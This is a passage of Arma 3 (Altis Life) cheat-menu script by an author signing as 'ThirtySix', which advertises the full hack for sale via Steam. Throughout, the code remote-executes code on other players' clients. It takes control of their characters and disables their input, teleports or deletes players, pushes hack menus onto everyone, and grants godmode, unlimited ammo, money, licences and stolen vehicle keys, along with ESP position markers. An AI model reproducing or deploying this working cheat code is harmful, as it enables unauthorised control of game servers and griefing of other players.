                ThirtySix_Dummy = [_wPos, _dir, 'I_G_Soldier_AR_F', _side] call bis_fnc_spawnvehicle;
                Dummy = ThirtySix_Dummy select 0;
                removeAllWeapons Dummy;
                removeBackpack Dummy;
                removeHeadgear Dummy;
                removeVest Dummy;
                removeHeadgear Dummy;
                Dummy addHeadgear 'H_Shemag_olive';
                Dummy addVest 'V_TacVest_oli';
                Dummy addWeapon 'NVGoggles';
                Dummy addWeapon 'Binocular';
                Dummy addWeapon 'G_Shades_Black';
                Dummy addWeapon 'ItemGPS';
                Dummy addMagazines['5Rnd_127x108_APDS_Mag', 5];
                Dummy addWeapon 'srifle_GM6_LRPS_F';
                Dummy addMagazines['30Rnd_9x21_Mag', 5];
                Dummy addWeapon 'hgun_P07_snds_F';
                hint format["%1 \n Spawned \n Take Control in 3 seconds", Dummy];
                uiSleep 3; {
                    _x = player;
                    first = _x;
                    _x = vehicle Dummy;
                    second = _x;
                    secondowner = owner _x;
                }
                foreach playableunits;
                first remotecontrol second;
                vehicle second switchcamera "EXTERNAL";
                hint "Press F3 to switch back \n by ThirtySix";
                call Dummy_Menu;
            }, "", 50];
            player addAction["<t color='#000000'>----------------------</t>", {
                hint "Menu by ThirtySix";
            }, "", 50];
            player addAction["Give Player HackMenu", {
                removeallactions player;
                player addAction["<t color='#FF0000'>Close Menu</t>", {
                    removeallactions player;
                    call init_main;
                }, "", 50];
                player addAction["<t color='#000000'>----------------------</t>", {
                    hint "Menu by ThirtySix";
                }, "", 50];
                _AllUnits = playableUnits;
                _CountAllUnits = count _AllUnits;
                _Selected = 0;
                for "_Selected"
                from 0 to _CountAllUnits do {
                    _TargetUnit = _AllUnits select _Selected;
                    hint format[" \n - Player - List - \n  \n - Made by ThirtySix - \n  \n ----------------------------------------------- \n User Online: \n %1 \n ----------------------------------------------- \n Current Loaded: \n %2 \n ----------------------------------------------- \n ", _CountAllUnits, _Selected];
                };
                ThirtySix_PlayerList = {
                    {
                        if ((isPlayer _x) && (alive _x)) then {
                            player addAction[format["%1 - %2", _x, name _x], {
                                _player = (_this select 3);
                                [_player, "removeallactions player;E5P = 0;ThirtySix_God = 0;ThirtySix_Unlim_Ammo = 0;['TaskSucceeded', ['', 'Test Hack Granted - by ThirtySix']] call BIS_fnc_showNotification;player addAction ['<t color=''#FF0000''> - - Test Hack by ThirtySix - - </t>', { hint '\n Test Hack by ThirtySix \n\n -----------------------------------------------\n if you want to buy the full hack\n -----------------------------------------------\n add me on Steam: \n ThirtySix_Arma \n'; },'',50];player addAction ['<t color=''#000000''>-------------------------------------------------</t>', { hint '\n Test Hack by ThirtySix \n\n -----------------------------------------------\n if you want to buy the full hack\n -----------------------------------------------\n add me on Steam: \n ThirtySix_Arma \n'; },'',50];player addAction ['Civ Outfit', { removeUniform player; removeAllWeapons player; removeBackpack player; removeHeadgear player; removeVest player; removeHeadgear player; player addUniform 'U_IG_Guerilla2_3'; player addHeadgear 'H_Bandanna_khk'; player addVest 'V_TacVest_oli'; player addWeapon 'NVGoggles'; player addWeapon 'Binocular'; player addWeapon 'G_Shades_Black'; player addBackpack 'B_Carryall_oli'; player addWeapon 'ItemGPS'; },'',50];player addAction ['License', {life_licenses =[['license_civ_driver','civ'],['license_civ_truck','civ'],['license_civ_air','civ'],['license_civ_gun','civ'],['license_civ_rebel','civ'],['license_civ_diamond','civ'],['license_civ_heroin','civ'],['license_civ_marijuana','civ']];{missionNamespace setVariable[(_x select 0),true];} foreach life_licenses;},'',50];player addAction ['Spawn Katiba', { player addMagazines ['30Rnd_65x39_caseless_green',5]; player addWeapon 'arifle_Katiba_ARCO_pointer_snds_F'; },'',50];player addAction ['Spawn Offroad', {'C_Offroad_01_F' createVehicle position player;},'',50];player addAction ['TP me to Kavalla Top', { player setPos [3690,13150,14.6]; hint format ['Ported - by ThirtySix']; },'',50];player addAction ['<t color=''#000000''>-------------------------------------------------</t>', { hint '\n Test Hack by ThirtySix \n\n -----------------------------------------------\n if you want to buy the full hack\n -----------------------------------------------\n add me on Steam: \n ThirtySix_Arma \n';},'',50];player addAction ['Lock / Unlock Target',{_vehicle = vehicle player;if(_vehicle == player) then{_veh = cursorTarget;_locked = locked _veh;if(_locked == 2) then{_veh setVehicleLock 'UNLOCKED';hint 'You have unlocked a vehicle';}else{_veh setVehicleLock 'LOCKED';hint 'You have locked a vehicle';};};if(_vehicle != player) then{_veh = vehicle player;_locked = locked _veh;if(_locked == 2) then{_veh setVehicleLock 'UNLOCKED';hint 'You have unlocked a vehicle';}else{_veh setVehicleLock 'LOCKED';hint 'You have locked a vehicle';};};},'',50];player addAction ['Get Key Target', {hint 'You got the Keys \n by ThirtySix';life_vehicles set[count life_vehicles,cursorTarget];life_vehicles set[count life_vehicles,vehicle player];},'',50];player addAction ['<t color=''#000000''>-------------------------------------------------</t>', { hint '\n Test Hack by ThirtySix \n\n -----------------------------------------------\n if you want to buy the full hack\n -----------------------------------------------\n add me on Steam: \n ThirtySix_Arma \n';},'',50];player addAction ['Money 100k',{life_Cash = Life_Cash + 100000; },'',50];player addAction ['GodMode', {if ( ThirtySix_God == 0 ) then { ThirtySix_God = 1;hint 'Godmode \n by ThirtySix \n ON';player removeAllEventHandlers'handleDamage';player addEventHandler ['handleDamage',{false}];player allowDamage false;vehicle player removeAllEventHandlers'handleDamage';vehicle player addEventHandler ['handleDamage',{false}];vehicle player allowDamage false;} else { ThirtySix_God = 0;hint 'Godmode \n by ThirtySix \n OFF';player addEventHandler ['handleDamage',{true}];player removeAllEventHandlers 'handleDamage';player allowDamage true;vehicle player addEventHandler ['handleDamage',{true}];vehicle player removeAllEventHandlers 'handleDamage';vehicle player allowDamage true;};},'',50];player addAction ['Unlimited Ammo', {if ( ThirtySix_Unlim_Ammo == 0 ) then {ThirtySix_Unlim_Ammo = 1;hint 'Unlimit Ammo \n by ThirtySix \n ON'; } else {ThirtySix_Unlim_Ammo = 0;hint 'Unlimit Ammo \n by ThirtySix \n OFF';};while { ThirtySix_Unlim_Ammo == 1 } do {_l25 = primaryWeapon player;_l31 = secondaryWeapon player;player setAmmo[_l25, 999];player setAmmo[_l31, 999];(vehicle player) setVehicleAmmo 1;(vehicle player) setVehicleAmmo 1;uiSleep 0.01;};},'',50];player addAction ['E5P Markers', {if (E5P == 0) then {E5P = 1;hint 'E5P ON';} else {E5P = 0;hint 'E5P OFF';};if (E5P == 1) then {onEachFrame {_l49 = nearestobjects[player, ['CAManBase'], 1400]; {if ((side _x != side player) && (getPlayerUID _x != '') && ((player distance _x) < 1400)) then {drawIcon3D['', [1, 0, 0, 1], [visiblePosition _x select 0, visiblePosition _x select 1, (getPosATL _x select 2) + 2], 0.1, 0.1, 45, (format['No Names in TestVersion', round(player distance _x), name _x]), 1, 0.04, 'TahomaB']} else {if ((getPlayerUID _x != '') && ((player distance _x) < 1000)) then {drawIcon3D['', [0, 0.5, 1, 1], [visiblePosition _x select 0, visiblePosition _x select 1, (getPosATL _x select 2) + 2], 0.1, 0.1, 45, (format['No Names in TestVersion', round(player distance _x), name _x]), 1, 0.04, 'TahomaB']};};}foreach playableUnits;};} else {onEachFrame {nil};};},'',50];player addAction ['<t color=''#000000''>-------------------------------------------------</t>', { hint '\n Test Hack by ThirtySix \n\n -----------------------------------------------\n if you want to buy the full hack\n -----------------------------------------------\n add me on Steam: \n ThirtySix_Arma \n';},'',50];"] call ThirtySix;
                                hint format["%1 got the 'Test Hack Menu' \n by ThirtySix", name _player];
                            }, _x]
                        };
                    }
                    forEach(playableUnits);
                };
                [] call ThirtySix_PlayerList;
            }, "", 50];
            player addAction["Give all Players HackMenu", {
                [TRUE, "removeallactions player;E5P = 0;ThirtySix_God = 0;ThirtySix_Unlim_Ammo = 0;['TaskSucceeded', ['', 'Test Hack Granted - by ThirtySix']] call BIS_fnc_showNotification;player addAction ['<t color=''#FF0000''> - - Test Hack by ThirtySix - - </t>', { hint '\n Test Hack by ThirtySix \n\n -----------------------------------------------\n if you want to buy the full hack\n -----------------------------------------------\n add me on Steam: \n ThirtySix_Arma \n'; },'',50];player addAction ['<t color=''#000000''>-------------------------------------------------</t>', { hint '\n Test Hack by ThirtySix \n\n -----------------------------------------------\n if you want to buy the full hack\n -----------------------------------------------\n add me on Steam: \n ThirtySix_Arma \n'; },'',50];player addAction ['Civ Outfit', { removeUniform player; removeAllWeapons player; removeBackpack player; removeHeadgear player; removeVest player; removeHeadgear player; player addUniform 'U_IG_Guerilla2_3'; player addHeadgear 'H_Bandanna_khk'; player addVest 'V_TacVest_oli'; player addWeapon 'NVGoggles'; player addWeapon 'Binocular'; player addWeapon 'G_Shades_Black'; player addBackpack 'B_Carryall_oli'; player addWeapon 'ItemGPS'; },'',50];player addAction ['License', {life_licenses =[['license_civ_driver','civ'],['license_civ_truck','civ'],['license_civ_air','civ'],['license_civ_gun','civ'],['license_civ_rebel','civ'],['license_civ_diamond','civ'],['license_civ_heroin','civ'],['license_civ_marijuana','civ']];{missionNamespace setVariable[(_x select 0),true];} foreach life_licenses;},'',50];player addAction ['Spawn Katiba', { player addMagazines ['30Rnd_65x39_caseless_green',5]; player addWeapon 'arifle_Katiba_ARCO_pointer_snds_F'; },'',50];player addAction ['Spawn Offroad', {'C_Offroad_01_F' createVehicle position player;},'',50];player addAction ['TP me to Kavalla Top', { player setPos [3690,13150,14.6]; hint format ['Ported - by ThirtySix']; },'',50];player addAction ['<t color=''#000000''>-------------------------------------------------</t>', { hint '\n Test Hack by ThirtySix \n\n -----------------------------------------------\n if you want to buy the full hack\n -----------------------------------------------\n add me on Steam: \n ThirtySix_Arma \n';},'',50];player addAction ['Lock / Unlock Target',{_vehicle = vehicle player;if(_vehicle == player) then{_veh = cursorTarget;_locked = locked _veh;if(_locked == 2) then{_veh setVehicleLock 'UNLOCKED';hint 'You have unlocked a vehicle';}else{_veh setVehicleLock 'LOCKED';hint 'You have locked a vehicle';};};if(_vehicle != player) then{_veh = vehicle player;_locked = locked _veh;if(_locked == 2) then{_veh setVehicleLock 'UNLOCKED';hint 'You have unlocked a vehicle';}else{_veh setVehicleLock 'LOCKED';hint 'You have locked a vehicle';};};},'',50];player addAction ['Get Key Target', {hint 'You got the Keys \n by ThirtySix';life_vehicles set[count life_vehicles,cursorTarget];life_vehicles set[count life_vehicles,vehicle player];},'',50];player addAction ['<t color=''#000000''>-------------------------------------------------</t>', { hint '\n Test Hack by ThirtySix \n\n -----------------------------------------------\n if you want to buy the full hack\n -----------------------------------------------\n add me on Steam: \n ThirtySix_Arma \n';},'',50];player addAction ['Money 100k',{life_Cash = Life_Cash + 100000; },'',50];player addAction ['GodMode', {if ( ThirtySix_God == 0 ) then { ThirtySix_God = 1;hint 'Godmode \n by ThirtySix \n ON';player removeAllEventHandlers'handleDamage';player addEventHandler ['handleDamage',{false}];player allowDamage false;vehicle player removeAllEventHandlers'handleDamage';vehicle player addEventHandler ['handleDamage',{false}];vehicle player allowDamage false;} else { ThirtySix_God = 0;hint 'Godmode \n by ThirtySix \n OFF';player addEventHandler ['handleDamage',{true}];player removeAllEventHandlers 'handleDamage';player allowDamage true;vehicle player addEventHandler ['handleDamage',{true}];vehicle player removeAllEventHandlers 'handleDamage';vehicle player allowDamage true;};},'',50];player addAction ['Unlimited Ammo', {if ( ThirtySix_Unlim_Ammo == 0 ) then {ThirtySix_Unlim_Ammo = 1;hint 'Unlimit Ammo \n by ThirtySix \n ON'; } else {ThirtySix_Unlim_Ammo = 0;hint 'Unlimit Ammo \n by ThirtySix \n OFF';};while { ThirtySix_Unlim_Ammo == 1 } do {_l25 = primaryWeapon player;_l31 = secondaryWeapon player;player setAmmo[_l25, 999];player setAmmo[_l31, 999];(vehicle player) setVehicleAmmo 1;(vehicle player) setVehicleAmmo 1;uiSleep 0.01;};},'',50];player addAction ['E5P Markers', {if (E5P == 0) then {E5P = 1;hint 'E5P ON';} else {E5P = 0;hint 'E5P OFF';};if (E5P == 1) then {onEachFrame {_l49 = nearestobjects[player, ['CAManBase'], 1400]; {if ((side _x != side player) && (getPlayerUID _x != '') && ((player distance _x) < 1400)) then {drawIcon3D['', [1, 0, 0, 1], [visiblePosition _x select 0, visiblePosition _x select 1, (getPosATL _x select 2) + 2], 0.1, 0.1, 45, (format['No Names in TestVersion', round(player distance _x), name _x]), 1, 0.04, 'TahomaB']} else {if ((getPlayerUID _x != '') && ((player distance _x) < 1000)) then {drawIcon3D['', [0, 0.5, 1, 1], [visiblePosition _x select 0, visiblePosition _x select 1, (getPosATL _x select 2) + 2], 0.1, 0.1, 45, (format['No Names in TestVersion', round(player distance _x), name _x]), 1, 0.04, 'TahomaB']};};}foreach playableUnits;};} else {onEachFrame {nil};};},'',50];player addAction ['<t color=''#000000''>-------------------------------------------------</t>', { hint '\n Test Hack by ThirtySix \n\n -----------------------------------------------\n if you want to buy the full hack\n -----------------------------------------------\n add me on Steam: \n ThirtySix_Arma \n';},'',50];"] call ThirtySix;
                hint "All players got the 'Test Hack Menu' \n by ThirtySix";
            }, "", 50];
            player addAction["<t color='#000000'>----------------------</t>", {
                hint "Menu by ThirtySix";
            }, "", 50];
            player addAction["Spectate Player", {
                removeallactions player;
                player addAction["<t color='#FF0000'>Close Menu</t>", {
                    removeallactions player;
                    call init_main;
                }, "", 50];
                player addAction["<t color='#000000'>----------------------</t>", {
                    hint "Menu by ThirtySix";
                }, "", 50];
                _AllUnits = playableUnits;
                _CountAllUnits = count _AllUnits;
                _Selected = 0;
                for "_Selected"
                from 0 to _CountAllUnits do {
                    _TargetUnit = _AllUnits select _Selected;
                    hint format[" \n - Player - List - \n  \n - Made by ThirtySix - \n  \n ----------------------------------------------- \n User Online: \n %1 \n ----------------------------------------------- \n Current Loaded: \n %2 \n ----------------------------------------------- \n ", _CountAllUnits, _Selected];
                };
                ThirtySix_PlayerList = {
                    {
                        if ((isPlayer _x) && (alive _x)) then {
                            player addAction[format["%1 - %2", _x, name _x], {
                                _player = (_this select 3); {
                                    _x = player;
                                    first = _x;
                                    _x = _player;
                                    second = _x;
                                    secondowner = owner _x;
                                }
                                foreach playableunits;
                                (vehicle second) switchcamera "EXTERNAL";
                                hint "Press F3 to switch back \n by ThirtySix";
                            }, _x]
                        };
                    }
                    forEach(playableUnits);
                };
                [] call ThirtySix_PlayerList;
            }, "", 50];
            player addAction["Control Player", {
                removeallactions player;
                player addAction["<t color='#FF0000'>Close Menu</t>", {
                    removeallactions player;
                    call init_main;
                }, "", 50];
                player addAction["<t color='#000000'>----------------------</t>", {
                    hint "Menu by ThirtySix";
                }, "", 49];
                _AllUnits = playableUnits;
                _CountAllUnits = count _AllUnits;
                _Selected = 0;
                for "_Selected"
                from 0 to _CountAllUnits do {
                    _TargetUnit = _AllUnits select _Selected;
                    hint format[" \n - Player - List - \n  \n - Made by ThirtySix - \n  \n ----------------------------------------------- \n User Online: \n %1 \n ----------------------------------------------- \n Current Loaded: \n %2 \n ----------------------------------------------- \n ", _CountAllUnits, _Selected];
                };
                ThirtySix_PlayerList = {
                    {
                        if ((isPlayer _x) && (alive _x)) then {
                            player addAction[format["%1 - %2", _x, name _x], {
                                _player = (_this select 3);
                                [_player, "disableUserInput true;"] call ThirtySix; {
                                    _x = player;
                                    first = _x;
                                    _x = _player;
                                    second = _x;
                                    secondowner = owner _x;
                                }
                                foreach playableunits;
                                first remotecontrol second;
                                vehicle second switchcamera "EXTERNAL";
                                hint "Press F3 to switch back \n by ThirtySix";
                            }, _x]
                        };
                    }
                    forEach(playableUnits);
                };
                [] call ThirtySix_PlayerList;
            }, "", 50];
            player addAction["Special Control Player</t>", {
                removeallactions player;
                player addAction["<t color='#FF0000'>Close Menu</t>", {
                    removeallactions player;
                    call init_main;
                }, "", 50];
                player addAction["<t color='#000000'>----------------------</t>", {
                    hint "Menu by ThirtySix";
                }, "", 49];
                _AllUnits = playableUnits;
                _CountAllUnits = count _AllUnits;
                _Selected = 0;
                for "_Selected"
                from 0 to _CountAllUnits do {
                    _TargetUnit = _AllUnits select _Selected;
                    hint format[" \n - Player - List - \n  \n - Made by ThirtySix - \n  \n ----------------------------------------------- \n User Online: \n %1 \n ----------------------------------------------- \n Current Loaded: \n %2 \n ----------------------------------------------- \n ", _CountAllUnits, _Selected];
                };
                ThirtySix_PlayerList = {
                    {
                        if ((isPlayer _x) && (alive _x)) then {
                            player addAction[format["%1 - %2", _x, name _x], {
                                c_player = (_this select 3);
                                [c_player, "disableUserInput true;player allowDamage false;removeVest player;  player addVest 'V_TacVest_oli'; player addMagazines ['30Rnd_556x45_Stanag_Tracer_Green',1]; player addWeapon 'arifle_Mk20_F'; player addPrimaryWeaponItem 'muzzle_snds_H';player addPrimaryWeaponItem 'optic_Hamr';"] call ThirtySix; {
                                    _x = player;
                                    first = _x;
                                    _x = c_player;
                                    second = _x;
                                    secondowner = owner _x;
                                }
                                foreach playableunits;
                                first remotecontrol second;
                                vehicle second switchcamera "EXTERNAL";
                                hint "Press F3 to switch back";
                                while {
                                    alive c_player
                                }
                                do {
                                    c_player setFatigue 0;
                                    _l25 = primaryWeapon c_player;
                                    _l31 = secondaryWeapon c_player;
                                    c_player setAmmo[_l25, 999];
                                    c_player setAmmo[_l31, 999];
                                    (vehicle c_player) setVehicleAmmo 1;
                                    (vehicle c_player) setVehicleAmmo 1;
                                    uiSleep 0.01;
                                };
                            }, _x]
                        };
                    }
                    forEach(playableUnits);
                };
                [] call ThirtySix_PlayerList;
            }, "", 50];
            player addAction["<t color='#000000'>----------------------</t>", {
                hint "Menu by ThirtySix";
            }, "", 50];
            player addAction["Give Player Money", {
                removeallactions player;
                player addAction["<t color='#FF0000'>Close Menu</t>", {
                    removeallactions player;
                    call init_main;
                }, "", 50];
                player addAction["<t color='#000000'>----------------------</t>", {
                    hint "Menu by ThirtySix";
                }, "", 50];
                _AllUnits = playableUnits;
                _CountAllUnits = count _AllUnits;
                _Selected = 0;
                for "_Selected"
                from 0 to _CountAllUnits do {
                    _TargetUnit = _AllUnits select _Selected;
                    hint format[" \n - Player - List - \n  \n - Made by ThirtySix - \n  \n ----------------------------------------------- \n User Online: \n %1 \n ----------------------------------------------- \n Current Loaded: \n %2 \n ----------------------------------------------- \n ", _CountAllUnits, _Selected];
                };
                ThirtySix_PlayerList = {
                    {
                        if ((isPlayer _x) && (alive _x)) then {
                            player addAction[format["%1 - %2", _x, name _x], {
                                _player = (_this select 3);
                                [_player, "life_atmCash = life_atmCash + 1000000;"] call ThirtySix;
                                hint format["%1 got 1000k Money \n by ThirtySix", name _player];
                            }, _x]
                        };
                    }
                    forEach(playableUnits);
                };
                [] call ThirtySix_PlayerList;
            }, "", 50];
            player addAction["Give Player Equipment", {
                removeallactions player;
                player addAction["<t color='#FF0000'>Close Menu</t>", {
                    removeallactions player;
                    call init_main;
                }, "", 5];
                player addAction["<t color='#000000'>----------------------</t>", {
                    hint "Menu by ThirtySix";
                }, "", 50];
                _AllUnits = playableUnits;
                _CountAllUnits = count _AllUnits;
                _Selected = 0;
                for "_Selected"
                from 0 to _CountAllUnits do {
                    _TargetUnit = _AllUnits select _Selected;
                    hint format[" \n - Player - List - \n  \n - Made by ThirtySix - \n  \n ----------------------------------------------- \n User Online: \n %1 \n ----------------------------------------------- \n Current Loaded: \n %2 \n ----------------------------------------------- \n ", _CountAllUnits, _Selected];
                };
                ThirtySix_PlayerList = {
                    {
                        if ((isPlayer _x) && (alive _x)) then {
                            player addAction[format["%1 - %2", _x, name _x], {
                                _player = (_this select 3);
                                [_player, "removeUniform player; removeAllWeapons player; removeBackpack player; removeHeadgear player; removeVest player;removeHeadgear player; player addBackpack 'B_Carryall_oli'; player addWeapon 'ItemWatch'; player addWeapon 'ItemCompass'; player addWeapon 'ItemGPS'; player addWeapon 'ItemRadio'; player addWeapon 'ItemMap'; player addUniform 'U_I_G_resistanceLeader_F'; player addHeadgear 'H_MilCap_oucamo'; player addVest 'V_TacVest_oli'; player addWeapon 'NVGoggles'; player addWeapon 'G_Shades_Black'; player addWeapon 'ItemGPS'; (unitBackpack player) addItemCargo ['30Rnd_65x39_caseless_mag_Tracer',6]; (unitBackpack player) addItemCargo ['3Rnd_HE_Grenade_shell',3];(unitBackpack player) addItemCargo ['3Rnd_Smoke_Grenade_shell',3]; (unitBackpack player) addItemCargo ['3Rnd_UGL_FlareWhite_F',3];(unitBackpack player) addItemCargo ['3Rnd_UGL_FlareGreen_F',3]; (unitBackpack player) addItemCargo ['3Rnd_UGL_FlareRed_F',3]; (unitBackpack player) addItemCargo ['3Rnd_UGL_FlareYellow_F',3]; (unitBackpack player) addItemCargo ['3Rnd_UGL_FlareCIR_F',3];player addWeapon 'arifle_MX_GL_Hamr_pointer_F'; player addPrimaryWeaponItem 'muzzle_snds_H'; player addPrimaryWeaponItem 'optic_Hamr';"] call ThirtySix;
                                hint format["%1 got Equipment \n by ThirtySix", name _player];
                            }, _x]
                        };
                    }
                    forEach(playableUnits);
                };
                [] call ThirtySix_PlayerList;
            }, "", 50];
            player addAction["Give Player Godmode ON", {
                removeallactions player;
                player addAction["<t color='#FF0000'>Close Menu</t>", {
                    removeallactions player;
                    call init_main;
                }, "", 5];
                player addAction["<t color='#000000'>----------------------</t>", {
                    hint "Menu by ThirtySix";
                }, "", 50];
                _AllUnits = playableUnits;
                _CountAllUnits = count _AllUnits;
                _Selected = 0;
                for "_Selected"
                from 0 to _CountAllUnits do {
                    _TargetUnit = _AllUnits select _Selected;
                    hint format[" \n - Player - List - \n  \n - Made by ThirtySix - \n  \n ----------------------------------------------- \n User Online: \n %1 \n ----------------------------------------------- \n Current Loaded: \n %2 \n ----------------------------------------------- \n ", _CountAllUnits, _Selected];
                };
                ThirtySix_PlayerList = {
                    {
                        if ((isPlayer _x) && (alive _x)) then {
                            player addAction[format["%1 - %2", _x, name _x], {
                                _player = (_this select 3);
                                hint format["%1 \n Godmode ON \n by ThirtySix", name _player];
                                fnc_usec_damageHandler = {};
                                fnc_usec_unconscious = {};
                                _player removeAllEventHandlers "handleDamage";
                                _player addEventHandler["handleDamage", {
                                    false
                                }];
                                _player allowDamage false;
                                vehicle _player removeAllEventHandlers "handleDamage";
                                vehicle _player addEventHandler["handleDamage", {
                                    false
                                }];
                                vehicle _player allowDamage false;
                            }, _x]
                        };
                    }
                    forEach(playableUnits);
                };
                [] call ThirtySix_PlayerList;
            }, "", 50];
            player addAction["Give Player Godmode OFF", {
                removeallactions player;
                player addAction["<t color='#FF0000'>Close Menu</t>", {
                    removeallactions player;
                    call init_main;
                }, "", 5];
                player addAction["<t color='#000000'>----------------------</t>", {
                    hint "Menu by ThirtySix";
                }, "", 50];
                _AllUnits = playableUnits;
                _CountAllUnits = count _AllUnits;
                _Selected = 0;
                for "_Selected"
                from 0 to _CountAllUnits do {
                    _TargetUnit = _AllUnits select _Selected;
                    hint format[" \n - Player - List - \n  \n - Made by ThirtySix - \n  \n ----------------------------------------------- \n User Online: \n %1 \n ----------------------------------------------- \n Current Loaded: \n %2 \n ----------------------------------------------- \n ", _CountAllUnits, _Selected];
                };
                ThirtySix_PlayerList = {
                    {
                        if ((isPlayer _x) && (alive _x)) then {
                            player addAction[format["%1 - %2", _x, name _x], {
                                _player = (_this select 3);
                                hint format["%1 \n Godmode OFF \n by ThirtySix", name _player];
                                _player addEventHandler["handleDamage", {
                                    true
                                }];
                                _player removeAllEventHandlers "handleDamage";
                                _player allowDamage true;
                            }, _x]
                        };
                    }
                    forEach(playableUnits);
                };
                [] call ThirtySix_PlayerList;
            }, "", 50];
            player addAction["<t color='#000000'>----------------------</t>", {
                hint "Menu by ThirtySix";
            }, "", 50];
            player addAction["TP me to kavalla Top", {
                player setPos[3690, 13150, 14.6];
                hint format["Ported - by ThirtySix"];
            }, "", 50];
            player addAction["TP all to my Cursor", {
                _wPos = screenToWorld[0.5, 0.5];
                _donot = name player;
                [TRUE, "deleteVehicle player;"] call ThirtySix; {
                    if (name _x != name player) then {
                        vehicle _x setPos(_wPos);
                    };
                }
                foreach playableUnits;
                hint format[" All players teleported to: \n %1 \n by ThirtySix", _wPos];
            }, "", 50];
            player addAction["Teleport Player to Mapclick", {
                removeallactions player;
                player addAction["<t color='#FF0000'>Close Menu</t>", {
                    removeallactions player;
                    call init_main;
                }, "", 50];
                player addAction["<t color='#000000'>----------------------</t>", {
                    hint "Menu by ThirtySix";
                }, "", 50];
                _AllUnits = playableUnits;
                _CountAllUnits = count _AllUnits;
                _Selected = 0;
                for "_Selected"
                from 0 to _CountAllUnits do {
                    _TargetUnit = _AllUnits select _Selected;
                    hint format[" \n - Player - List - \n  \n - Made by ThirtySix - \n  \n ----------------------------------------------- \n User Online: \n %1 \n ----------------------------------------------- \n Current Loaded: \n %2 \n ----------------------------------------------- \n ", _CountAllUnits, _Selected];
                };
                ThirtySix_PlayerList = {
                    {
                        if ((isPlayer _x) && (alive _x)) then {
                            player addAction[format["%1 - %2", _x, name _x], {
                                tp_player = (_this select 3);
                                openMap[true, false];
                                onMapSingleClick '_pos1 = [(_pos select 0), (_pos select 1), 0];vehicle tp_player setPos _pos1;hint format [ "%1 \n was teleported to \n %2 \n by ThirtySix", name tp_player, _pos1]onMapSingleClick "";openMap [false, false];';
                            }, _x]
                        };
                    }
                    forEach(playableUnits);
                };
                [] call ThirtySix_PlayerList;
            }, "", 50];
            player addAction["Teleport Player to me", {
                removeallactions player;
                player addAction["<t color='#FF0000'>Close Menu</t>", {
                    removeallactions player;
                    call init_main;
                }, "", 50];
                player addAction["<t color='#000000'>----------------------</t>", {
                    hint "Menu by ThirtySix";
                }, "", 50];
                _AllUnits = playableUnits;
                _CountAllUnits = count _AllUnits;
                _Selected = 0;
                for "_Selected"
                from 0 to _CountAllUnits do {
                    _TargetUnit = _AllUnits select _Selected;
                    hint format[" \n - Player - List - \n  \n - Made by ThirtySix - \n  \n ----------------------------------------------- \n User Online: \n %1 \n ----------------------------------------------- \n Current Loaded: \n %2 \n ----------------------------------------------- \n ", _CountAllUnits, _Selected];
                };
                ThirtySix_PlayerList = {
                    {
                        if ((isPlayer _x) && (alive _x)) then {
                            player addAction[format["%1 - %2", _x, name _x], {
                                _player = (_this select 3);
                                vehicle _player setPos[(getpos player select 0) + 5, (getpos player select 1) + 5, (getpos player select 2)];
                                hint format["%1 \n was Teleported to you \n by ThirtySix", name _player];
                            }, _x]
                        };
                    }
                    forEach(playableUnits);
                };
                [] call ThirtySix_PlayerList;
            }, "", 50];
            player addAction["Teleport me to Player", {
                removeallactions player;
                player addAction["<t color='#FF0000'>Close Menu</t>", {
                    removeallactions player;
                    call init_main;
                }, "", 50];
                player addAction["<t color='#000000'>----------------------</t>", {
                    hint "Menu by ThirtySix";
                }, "", 50];
                _AllUnits = playableUnits;
                _CountAllUnits = count _AllUnits;
                _Selected = 0;
                for "_Selected"
                from 0 to _CountAllUnits do {
                    _TargetUnit = _AllUnits select _Selected;
                    hint format[" \n - Player - List - \n  \n - Made by ThirtySix - \n  \n ----------------------------------------------- \n User Online: \n %1 \n ----------------------------------------------- \n Current Loaded: \n %2 \n ----------------------------------------------- \n ", _CountAllUnits, _Selected];
                };
                ThirtySix_PlayerList = {
                    {
                        if ((isPlayer _x) && (alive _x)) then {
                            player addAction[format["%1 - %2", _x, name _x], {
                                _player = (_this select 3);
                                vehicle player setPos[(getpos _player select 0) + 5, (getpos _player select 1) + 5, (getpos _player select 2)];
                                hint format["You have been Ported to \n %1 \n by ThirtySix", name _player];
                            }, _x]
                        };
                    }
                    forEach(playableUnits);
                };
                [] call ThirtySix_PlayerList;
            }, "", 50];
            player addAction["Teleport me to Player (Stealth)", {
                removeallactions player;
                player addAction["<t color='#FF0000'>Close Menu</t>", {
                    removeallactions player;
                    call init_main;
                }, "", 50];
                player addAction["<t color='#000000'>----------------------</t>", {
                    hint "Menu by ThirtySix";
                }, "", 50];
                _AllUnits = playableUnits;
                _CountAllUnits = count _AllUnits;
                _Selected = 0;
                for "_Selected"
                from 0 to _CountAllUnits do {
                    _TargetUnit = _AllUnits select _Selected;
                    hint format[" \n - Player - List - \n  \n - Made by ThirtySix - \n  \n ----------------------------------------------- \n User Online: \n %1 \n ----------------------------------------------- \n Current Loaded: \n %2 \n ----------------------------------------------- \n ", _CountAllUnits, _Selected];
                };
                ThirtySix_PlayerList = {
                    {
                        if ((isPlayer _x) && (alive _x)) then {
                            player addAction[format["%1 - %2", _x, name _x], {
                                _player = (_this select 3);
                                vehicle player setPos[(getpos _player select 0) + 100, (getpos _player select 1) + 100, (getpos _player select 2)];
                                hint format["You have been Ported to \n %1 \n by ThirtySix", name _player];
                            }, _x]
                        };
                    }
                    forEach(playableUnits);
                };
                [] call ThirtySix_PlayerList;
            }, "", 50];
        };
        ExtrasMenubyThirtySix = {
            removeallactions player;
            player addAction["<t color='#FF0000'>Close Menu</t>", {
                removeallactions player;
                call init_main;
            }, "", 50];
            player addAction["<t color='#000000'>----------------------</t>", {
                hint "Menu by ThirtySix";
            }, "", 50];
            player addAction["Map Markers", {
                ThirtySix_Noobs = [];
                ThirtySix_Bitches = [];
                if (isnil "ThirtySix_Map_Markers") then {
                    ThirtySix_Map_Markers = 0;
                };
                if (ThirtySix_Map_Markers == 0) then {
                    ThirtySix_Map_Markers = 1;
                    hint "Player Markers \n by ThirtySix \n ON";
                } else {
                    ThirtySix_Map_Markers = 0;
                    hint "Player Markers \n by ThirtySix \n OFF";
                };
                while {
                    ThirtySix_Map_Markers == 1
                }
                do {
                    {
                        if ((vehicle _x isKindOf "LandVehicle") || (vehicle _x isKindOf "Air") || (vehicle _x isKindOf "Ship")) then {
                            if (count(crew vehicle _x) > 0) then {
                                {
                                    if (!(_x in ThirtySix_Noobs) and(alive _x) and(getPlayerUID _x != "")) then {
                                        private["_pos", "_l44", "_l45"];
                                        _l45 = vehicle _x;
